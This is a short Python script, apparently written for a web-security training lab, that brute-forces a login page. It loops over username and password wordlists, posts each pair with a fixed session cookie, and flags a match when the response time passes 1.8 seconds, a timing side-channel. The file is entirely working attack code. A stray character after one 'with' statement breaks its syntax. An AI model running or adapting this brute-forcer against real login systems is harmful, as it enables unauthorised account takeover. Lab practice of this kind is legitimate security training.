import requests
import sys

url = "https://ac101fdd1fb90e41c02e1ab000760026.web-security-academy.net/login"
cookie = {'session':'ew0ps8VCZzqRLCPT4vnxp3uvzXo4A4tc'}

post_data = ""
#proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

hit = "Invalid username or password."

with open('usernames.txt') as f:U
	for usernames in f:
		user = usernames.strip()
		with open('passwords.txt') as e:
			for passwords in e:
				password = passwords.strip()
				sys.stdout.write(f"\r[+]Username: {user}  [+]Password: {password}")
				post_data = {'username':user,'password':password}
				r = requests.post(url, data=post_data, cookies=cookie)
				#debug
				#r = requests.post(url, data=post_data, cookies=cookie, proxies=proxy, verify=False)

				if r.elapsed.total_seconds() > 1.8:
					print(f"\n[+]Cracked {user}:{password}")
					break

		
		
